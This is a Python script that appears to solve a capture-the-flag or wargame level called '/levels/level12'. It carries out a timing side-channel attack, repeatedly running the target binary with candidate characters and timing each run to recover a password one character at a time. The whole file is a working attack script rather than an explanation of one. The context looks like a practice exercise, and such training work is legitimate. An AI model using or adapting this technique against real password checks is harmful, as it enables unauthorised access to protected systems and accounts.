import collections
import pprint
import statistics
import string
import subprocess
import time

CHARSET = string.printable

def prefix_test(prefix, test_count=8):
    times = collections.defaultdict(list)
    for i in range(test_count):
        for ch in CHARSET:
            head = time.time_ns()
            subprocess.check_call([
                '/levels/level12',
                    prefix + ch,
                    '0x0',
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL)
            tail = time.time_ns()
            times[ch].append(tail - head)

    all_timings = []
    ch_timings = {}
    for (ch, timings) in times.items():
        ch_timings[ch] = sum(timings) / len(timings)
        all_timings.append(ch_timings[ch])

    mean_time = sum(all_timings) / len(all_timings)
    stdev_time = statistics.stdev(all_timings)

    # -
    found_ch_value = None
    found_ch_timing = float('inf')

    for (ch, timing) in ch_timings.items():
        if timing / mean_time < 0.85:
            if found_ch_value is not None:
                pprint.pprint(ch_timings)
                raise RuntimeError('Ambiguous time')

            found_ch_value = ch

    if found_ch_value is None:
        raise RuntimeError('Incomplete time')

    return (stdev_time, found_ch_value)

password = ''
max_password_length = 19
all_stdev = []

for i in range(max_password_length):
    try:
        (this_stdev, this_password) = prefix_test(password, 16)
    except RuntimeError:
        break

    if len(all_stdev) < 3:
        all_stdev.append(this_stdev)
        password += this_password
        continue

    cur_mean  = sum(all_stdev) / len(all_stdev)
    cur_stdev = statistics.stdev(all_stdev)

    all_stdev.append(this_stdev)
    password += this_password


print(password)
#with open('password', 'w') as fp:
#    fp.write(password)

